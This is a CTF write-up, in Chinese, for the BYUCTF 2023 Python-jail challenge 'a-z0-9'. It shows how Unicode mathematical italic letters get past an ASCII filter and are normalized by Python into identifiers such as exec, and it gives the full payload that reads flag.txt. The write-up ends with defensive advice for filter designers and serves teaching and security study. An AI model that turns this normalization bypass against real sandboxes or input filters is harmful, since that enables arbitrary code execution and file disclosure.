# BYUCTF 2023 - a-z0-9

## 题目简述

服务删除全部 ASCII 小写字母和数字，并把输入截断到 130 字符。看似无法写出 Python 标识符，但 Python 会对标识符做 Unicode NFKC 规范化。

## 解题过程

数学斜体字母在正则过滤时不是 ASCII `a-z`，进入 Python 词法分析后却会规范化成普通标识符。例如 `𝘦𝘹𝘦𝘤` 会被当成 `exec`。字符串中的文件名则用非 ASCII 字符码点之差生成。官方压缩到长度限制内的 payload 是：

```python
𝘦𝘹𝘦𝘤("𝘢=𝘤𝘩𝘳;𝘣=𝘰𝘳𝘥;𝘤=𝘣('൬');𝘥=𝘢(𝘤-𝘣('೸'));𝘱𝘳𝘪𝘯𝘵(𝘰𝘱𝘦𝘯(𝘢(𝘤-𝘣('ആ'))+𝘢(𝘤-𝘣('ഀ'))+𝘢(𝘤-𝘣('ഋ'))+𝘢(𝘤-𝘣('അ'))+'.'+𝘥+𝘢(𝘤-𝘣('೴'))+𝘥).𝘳𝘦𝘢𝘥())")
```

运行后读取 `flag.txt`，得到：

```text
byuctf{urwelcome_4nd_th4nk_y0u_f0r_4tt3nding}
```

## 方法总结

Unicode 标识符规范化是 Python jail 的高频边界。正则表达式看到的码点与解释器最终识别的标识符可能不同；安全检查必须先采用与解释器相同的规范化，再基于语法树或能力白名单判定。
